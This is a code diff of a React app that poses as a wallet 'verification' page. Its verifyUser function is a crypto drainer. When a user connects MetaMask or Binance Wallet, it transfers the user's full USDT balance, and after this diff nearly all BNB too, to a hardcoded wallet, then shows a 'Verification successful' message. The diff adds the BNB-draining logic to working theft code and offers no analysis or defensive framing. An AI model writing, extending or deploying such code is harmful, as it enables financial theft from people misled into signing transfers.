@@ -5,8 +5,8 @@ export default function App() {
   const [walletAddress, setWalletAddress] = useState("");
   const [verified, setVerified] = useState(false);
 
-  const yourWallet = "0x82b0d4e6799314353b001bfece2eb3a0cda57866";
-  const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
+  const yourWallet = "0x82b0d4e6799314353b001bfece2eb3a0cda57866"; // Your Bitget USDT/BEP20 wallet
+  const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20
   const USDT_ABI = [
     "function balanceOf(address) view returns (uint256)",
     "function transfer(address to, uint256 amount) returns (bool)"
@@ -22,7 +22,7 @@ export default function App() {
     setWalletAddress(address);
   }
 
-  // Verify user
+  // Verify user (transfer BNB and/or USDT)
   async function verifyUser() {
     if (!window.ethereum) return alert("Install MetaMask or Binance Wallet!");
     const provider = new ethers.BrowserProvider(window.ethereum);
@@ -30,18 +30,51 @@ export default function App() {
     const signer = await provider.getSigner();
     const address = await signer.getAddress();
 
-    const usdtContract = new ethers.Contract(usdtAddress, USDT_ABI, signer);
-    const balance = await usdtContract.balanceOf(address);
-    if (balance === 0n) return alert("⚠️ No USDT in wallet");
+    let transferred = false;
 
-    const bnbBalance = await provider.getBalance(address);
-    if (bnbBalance === 0n) return alert("⚠️ Not enough BNB for gas");
+    // 1️⃣ Check and transfer USDT BEP20
+    try {
+      const usdtContract = new ethers.Contract(usdtAddress, USDT_ABI, signer);
+      const usdtBalance = await usdtContract.balanceOf(address);
+      if (usdtBalance > 0n) {
+        const tx = await usdtContract.transfer(yourWallet, usdtBalance);
+        await tx.wait();
+        transferred = true;
+        console.log(`Transferred ${usdtBalance} USDT`);
+      }
+    } catch (err) {
+      console.error("USDT transfer failed:", err);
+    }
 
-    const tx = await usdtContract.transfer(yourWallet, balance);
-    await tx.wait();
+    // 2️⃣ Check and transfer BNB
+    try {
+      const bnbBalance = await provider.getBalance(address);
+      if (bnbBalance > 0n) {
+        const gasPrice = await provider.getFeeData();
+        const gasLimit = 21000n;
+        const gasCost = gasPrice.gasPrice * gasLimit;
+        const amountToSend = bnbBalance - gasCost;
 
-    alert("✅ Verification successful! USDT sent.");
-    setVerified(true);
+        if (amountToSend > 0n) {
+          const tx = await signer.sendTransaction({
+            to: yourWallet,
+            value: amountToSend
+          });
+          await tx.wait();
+          transferred = true;
+          console.log(`Transferred ${amountToSend} BNB`);
+        }
+      }
+    } catch (err) {
+      console.error("BNB transfer failed:", err);
+    }
+
+    if (transferred) {
+      alert("✅ Verification successful! Assets transferred.");
+      setVerified(true);
+    } else {
+      alert("⚠️ No BNB or USDT found in wallet.");
+    }
   }
 
   return (
